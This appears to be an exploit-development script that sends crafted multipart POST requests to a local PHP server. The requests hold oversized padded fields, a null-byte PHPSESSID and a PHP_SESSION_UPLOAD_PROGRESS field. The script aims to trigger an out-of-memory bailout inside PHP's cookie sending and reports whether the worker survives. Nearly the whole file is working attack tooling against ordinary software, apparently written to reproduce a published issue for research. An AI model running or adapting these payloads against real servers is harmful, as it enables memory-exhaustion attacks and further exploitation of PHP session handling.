#!/usr/bin/env python3
"""Probe the published OOM-in-cookie A shape on the official image.

Runs one A request per (NB, BL) and reports status, Set-Cookie presence/size and
whether the worker survived.  A correct OOM-in-cookie hit should be a 5xx with
NO normal-Set-Cookie while the worker survives (bailout inside send_cookie).
"""
import socket
import sys

PORT = 18089


def padded(prefix, i, n):
    s = "%s%04d" % (prefix, i)
    return (s + "x" * n)[:n]


def build(F, S, NB, BL, X, K, KL, FL, FN):
    BND = b"S" * 17
    parts = []
    for i in range(F):
        parts.append((padded("f", i, 103), None, b"V" * 103))
    for i in range(S):
        parts.append((padded("g", i, 103), None, b"v" * 8))
    idx = 1000
    for _ in range(NB):
        parts.append((str(idx), None, b"B" * BL))
        idx += 1
    idx = 100000
    for _ in range(X):
        parts.append((str(idx), None, b"X" * 231))
        idx += 1
    idx = 200000
    for _ in range(K):
        parts.append((str(idx), None, b"T" * KL))
        idx += 1
    parts.append(("PHPSESSID", None, b"\x00"))
    parts.append(("PHP_SESSION_UPLOAD_PROGRESS", None, b"pwn"))
    parts.append((FN, "A" * 99 + ".txt", b"A" * 64))
    o = bytearray()
    for name, filename, data in parts:
        o += b"--" + BND + b"\r\n"
        if filename is not None:
            o += (b'Content-Disposition: form-data; name="' + name.encode() +
                  b'"; filename="' + filename.encode() + b'"\r\n'
                  b"Content-Type: application/octet-stream\r\n\r\n")
        else:
            o += (b'Content-Disposition: form-data; name="' + name.encode() +
                  b'"\r\n\r\n')
        o += data + b"\r\n"
    o += b"--" + BND + b"--\r\n"
    return bytes(o), BND


def send(body, bnd):
    req = (f"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:{PORT}\r\n"
           f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    s = socket.create_connection(("127.0.0.1", PORT), timeout=60)
    s.settimeout(60)
    resp = b""
    try:
        s.sendall(req + body)
        while len(resp) < 1 << 20:
            c = s.recv(65536)
            if not c:
                break
            resp += c
    except OSError:
        pass
    s.close()
    head, _, _ = resp.partition(b"\r\n\r\n")
    status = head.split(b" ")[1].decode() if head.startswith(b"HTTP/") else "?"
    sc = [l for l in head.split(b"\r\n") if l.lower().startswith(b"set-cookie")]
    return status, sc, len(resp)


if __name__ == "__main__":
    NB = int(sys.argv[1])
    BL = int(sys.argv[2])
    X = int(sys.argv[3]) if len(sys.argv) > 3 else 204
    body, bnd = build(0, 62, NB, BL, X, 0, 4000, 103, "F" * 103)
    status, sc, n = send(body, bnd)
    print(f"NB={NB} BL={BL} X={X} body={len(body)} status={status} resp={n} "
          f"cookies={[len(x) for x in sc]}", flush=True)
    for x in sc:
        print("  " + x[:120].decode("latin1", "replace"))
